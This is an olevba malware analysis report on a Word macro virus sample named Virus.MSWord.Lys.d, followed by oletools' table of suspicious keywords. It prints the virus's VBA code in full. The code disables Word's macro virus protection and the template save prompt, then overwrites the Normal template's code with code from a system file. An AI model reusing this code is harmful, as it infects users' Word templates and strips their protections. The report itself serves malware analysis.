olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lys.d-f79b84955ceec83ceed4ae415e2b9c9cba8acd31
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lys.d-f79b84955ceec83ceed4ae415e2b9c9cba8acd31 
in file: Virus.MSWord.Lys.d-f79b84955ceec83ceed4ae415e2b9c9cba8acd31 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set Daydream = WScript.CreateObject("Word.Application")
Daydream.Options.VirusProtection = False
Daydream.Options.SaveNormalPrompt = False
For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Daydream.sys")
Daydream.Application.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

